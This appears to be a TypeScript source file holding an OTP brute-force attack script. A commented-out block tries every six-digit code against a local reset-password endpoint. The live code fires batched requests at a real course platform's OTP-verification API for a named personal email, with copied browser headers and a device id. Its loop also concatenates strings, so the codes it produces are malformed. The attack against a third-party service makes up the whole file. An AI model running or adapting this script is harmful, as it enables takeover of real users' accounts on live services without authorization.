// const Attacker = async () => {
//     const resposne = await fetch('http://localhost:3000/generate-otp',{
//         method:'POST',
//         headers:{
//                 'Content-Type': 'application/json'
//         },
//         body:JSON.stringify({
//             email:'yashyadavpro@gmail.com'
//         })
//     })
//     console.log(resposne)
//     for (let i = 1; i <= 999999; i++) {
//         const otp = i.toString().padStart(6, '0'); // Pads the number to ensure it’s 6 digits
//         console.log(otp)

//         await fetch('http://localhost:3000/reset-password', {
//             method: 'POST',
//             headers: {
//                 'Content-Type': 'application/json'
//             },
//             body: JSON.stringify({
//                 email: "yashyadavpro@gmail.com",
//                 otp: otp,
//                 newPassword: "77492562"
//             })
//         }).catch(error => console.error("Request failed:", error));
//     }
// };
import axios from "axios";

// async function sendRequest(otp: number) {
  // let data = JSON.stringify({
  //   "email": "yashyadavpro@gmail.com",
  //   "otp": otp,
  //   "newPassword": "123123123"
  // });

  async function sendRequest(otp:string) {
    let config = {
      method: 'get',
      maxBodyLength: Infinity,
      url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=yashyadavpro%40gmail.com&otp=${otp}&device_id=WebBrowser1730785009895iycyfw4md2m&mydeviceid=&mydeviceid2=`,
      headers: { 
        'accept': '*/*', 
        'accept-language': 'en-US,en;q=0.9', 
        'auth-key': 'appxapi', 
        'client-service': 'Appx', 
        'device-type': '', 
        'origin': 'https://harkirat.classx.co.in', 
        'priority': 'u=1, i', 
        'referer': 'https://harkirat.classx.co.in/', 
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"', 
        'sec-ch-ua-mobile': '?0', 
        'sec-ch-ua-platform': '"Windows"', 
        'sec-fetch-dest': 'empty', 
        'sec-fetch-mode': 'cors', 
        'sec-fetch-site': 'same-site', 
        'source': 'website', 
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
      }
    };
  
    // Send the request with the configured URL and headers
    try {
      const response = await fetch(config.url, config);
      console.log(`Response for OTP ${otp}:`, await response.json());
    } catch (error) {
      console.error(`Request failed for OTP ${otp}:`, error);
    }
  }
  
  async function main() {
    for (let i = 0; i < 1000000; i += 100) {
      const promises = [];
      console.log("Starting batch at OTP " + i);
      for (let j = 0; j < 100; j++) {
        promises.push(sendRequest(i + j.toString()));
      }
      await Promise.all(promises);
    }
  }
  
  main();
  



